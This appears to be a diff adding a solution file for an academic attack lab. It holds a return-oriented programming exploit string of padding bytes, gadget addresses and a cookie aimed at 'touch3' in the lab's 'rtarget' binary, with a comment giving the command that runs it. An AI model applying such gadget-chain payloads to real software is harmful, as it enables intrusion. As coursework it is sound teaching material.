@@ -1,0 +1,18 @@
+00 00 00 00 00 00 00 00 /* gabage bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00 /* put the current address into rdi */
+a2 19 40 00 00 00 00 00 /* rsp points at this line when movq %rsp,%rax */
+ab 19 40 00 00 00 00 00 /* put the offset(8 lines) into rsi */
+48 00 00 00 00 00 00 00 /* offset 9 lines * 8 = 72(0x48) */
+dd 19 40 00 00 00 00 00
+34 1a 40 00 00 00 00 00
+13 1a 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00 /* add rdi and rsi into rax */
+a2 19 40 00 00 00 00 00 /* put the rax into rdi */
+fa 18 40 00 00 00 00 00 /* address of touch3 */
+35 39 62 39 39 37 66 61 /* cookie */
+00
+/* run ./hex2raw < r_level3.txt | ./rtarget -q in target1 file */
